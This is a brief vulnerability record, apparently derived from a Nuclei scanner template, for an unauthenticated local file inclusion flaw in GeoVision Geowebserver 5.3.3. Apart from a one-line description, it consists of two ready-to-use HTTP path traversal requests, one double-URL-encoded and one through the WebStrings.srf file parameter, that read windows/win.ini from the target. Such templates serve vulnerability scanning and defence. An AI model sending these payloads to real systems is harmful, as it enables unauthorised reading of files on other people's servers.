# Vulnerability: GeoVision Geowebserver 5.3.3 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`geovision-geowebserver-lfi.yaml`)

## Description
GeoVision Geowebserver 5.3.3 allows remote unauthenticated attackers to disclose the content of locally stored files via local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini
GET {{BaseURL}}/Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=aaa
```

